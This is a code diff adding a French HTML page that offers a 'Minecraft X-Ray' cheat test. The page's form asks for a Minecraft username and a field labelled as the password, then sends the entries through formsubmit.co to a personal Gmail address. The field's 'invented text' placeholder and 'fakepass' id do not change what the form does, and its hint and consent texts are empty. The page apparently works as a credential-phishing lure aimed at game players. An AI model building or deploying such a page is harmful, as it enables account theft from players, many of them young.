@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#101820">
+  <title>Minecraft X-Ray — Test d'installation</title>
+  <style>
+    :root { color-scheme: dark; --green:#55e38a; --panel:#18242d; --muted:#a9b8c2; }
+    * { box-sizing:border-box; }
+    body {
+      margin:0; min-height:100vh; display:grid; place-items:center; padding:24px;
+      font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+      background: radial-gradient(circle at 50% 0%, #234735 0, #101820 48%, #080d12 100%);
+      color:#f4f8fa;
+    }
+    .card { width:min(100%,470px); background:rgba(24,36,45,.96); border:1px solid #385348;
+      border-radius:20px; padding:28px; box-shadow:0 20px 70px #0008; }
+    .logo { width:64px;height:64px;display:grid;place-items:center;margin:0 auto 14px;
+      border-radius:16px;background:#203d2d;font-size:34px;border:1px solid #477a58; }
+    h1 { text-align:center;font-size:25px;margin:0 0 6px; }
+    .sub { text-align:center;color:var(--muted);margin:0 0 24px;font-size:14px; }
+    label { display:block;font-weight:650;margin:16px 0 7px;font-size:14px; }
+    input { width:100%;padding:13px 14px;border-radius:10px;border:1px solid #43545e;
+      background:#0e171e;color:white;font:inherit;outline:none; }
+    input:focus { border-color:var(--green);box-shadow:0 0 0 3px #55e38a22; }
+    .hint { color:#f4d58b;font-size:12px;line-height:1.45;margin:7px 0 0; }
+    .consent { display:flex;gap:10px;align-items:flex-start;margin:20px 0;color:#dce6e9;font-size:13px;line-height:1.45; }
+    .consent input { width:18px;height:18px;margin:1px 0 0;flex:0 0 auto;accent-color:var(--green); }
+    button { width:100%;border:0;border-radius:11px;padding:14px;background:var(--green);
+      color:#092013;font-weight:800;font-size:15px;cursor:pointer; }
+    button:hover { filter:brightness(1.06); }
+    .notice { margin-top:18px;padding:12px;border-radius:10px;background:#342b17;color:#ffe4a5;
+      font-size:12px;line-height:1.5;border:1px solid #65502a; }
+    .foot { color:#83949e;text-align:center;font-size:11px;margin:18px 0 0; }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <div class="logo" aria-hidden="true">⛏️</div>
+    <h1>Minecraft X-Ray</h1>
+    <p class="sub">Formulaire de participation au test</p>
+
+    <form action="https://formsubmit.co/Rayan0malinoi7@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="Nouvelle participation — test X-Ray Minecraft">
+      <input type="hidden" name="_captcha" value="true">
+      <input type="hidden" name="_template" value="table">
+
+      <label for="pseudo">Pseudo Minecraft</label>
+      <input id="pseudo" name="Pseudo Minecraft" type="text" maxlength="32"
+             placeholder="Entre ton pseudo" autocomplete="off" required>
+
+      <label for="mosdepass">Mot de passe </label>
+      <input id="fakepass" name="name"
+             type="text" maxlength="80" placeholder="Écris un texte inventé" autocomplete="off" required>
+      <p class="hint">.</p>
+
+      <label class="consent">
+        <input type="checkbox" name="Consentement" value="Oui, je participe " required>
+        <span>J'accepte .</span>
+      </label>
+
+      <button type="submit">Lancer le test X-Ray</button>
+    </form>
+
+    <div class="notice">
+      Test de participation Minecraft X-Ray.
+    </div>
+    <p class="foot">Minecraft X-Ray</p>
+  </main>
+</body>
+</html>
